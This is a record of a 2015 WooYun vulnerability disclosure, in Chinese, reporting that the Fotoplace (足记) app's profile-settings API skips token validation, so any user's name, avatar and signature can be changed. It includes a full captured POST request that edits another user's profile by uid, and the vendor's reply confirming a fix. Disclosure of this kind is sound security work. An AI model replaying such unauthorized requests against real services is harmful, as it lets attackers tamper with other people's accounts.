{"id": 40895, "wybug_id": "wooyun-2015-0102835", "wybug_title": "足记app任意用户资料修改", "wybug_corp": "fotoplace.cc", "wybug_author": "Vern", "wybug_date": "2015-03-30 13:47", "wybug_open_date": "2015-05-14 13:52", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向公众公开  简要描述： fotoplace.cc这两天空间各种足记app的图片  大片即视感    听说足记挺火的 几千万的用户量   然后我就下载了 详细说明：  问题出在修改个人资料处\n\n修改抓包\n\ntoken无验证 各种越权操作找一个用户测试一下\n\n抓包得到这个用户的id\n\n得到目标用户uid217提交包修改\nPOST /api2/user%2Fuser_change_settings.php HTTP/1.1Content-Type: multipart/form-data; boundary=01f905f0-8933-45d5-8f64-eed54d9ee2b8Content-Length: 13069Host: fotoplace.ccConnection: Keep-AliveAccept-Encoding: gzipUser-Agent: okhttp/2.3.0--01f905f0-8933-45d5-8f64-eed54d9ee2b8Content-Disposition: form-data; name=\"version\"Content-Type: text/plain; charset=UTF-8Content-Length: 3Content-Transfer-Encoding: binary2.3--01f905f0-8933-45d5-8f64-eed54d9ee2b8Content-Disposition: form-data; name=\"uid\"Content-Type: text/plain; charset=UTF-8Content-Length: 7Content-Transfer-Encoding: binary217--01f905f0-8933-45d5-8f64-eed54d9ee2b8Content-Disposition: form-data; name=\"token\"Content-Type: text/plain; charset=UTF-8Content-Length: 64Content-Transfer-Encoding: binary--01f905f0-8933-45d5-8f64-eed54d9ee2b8Content-Disposition: form-data; name=\"userName\"Content-Type: text/plain; charset=UTF-8Content-Length: 7Content-Transfer-Encoding: binarytestwooyun--01f905f0-8933-45d5-8f64-eed54d9ee2b8Content-Disposition: form-data; name=\"location\"Content-Type: text/plain; charset=UTF-8Content-Length: 3Content-Transfer-Encoding: binarytest by wooyun--01f905f0-8933-45d5-8f64-eed54d9ee2b8Content-Disposition: form-data; name=\"description\"Content-Type: text/plain; charset=UTF-8Content-Length: 5Content-Transfer-Encoding: binarytest hahaha by wooyun--01f905f0-8933-45d5-8f64-eed54d9ee2b8\n\n\n返回成功\n\n修改目标用户信息成功（包括头像 用户名 签名）   漏洞证明：  \n\n\n\n   修复方案：  各种验证   版权声明：转载请注明来源 Vern@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-30 13:51 厂商回复： 已经加上token验证, 多谢Vern的发现. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}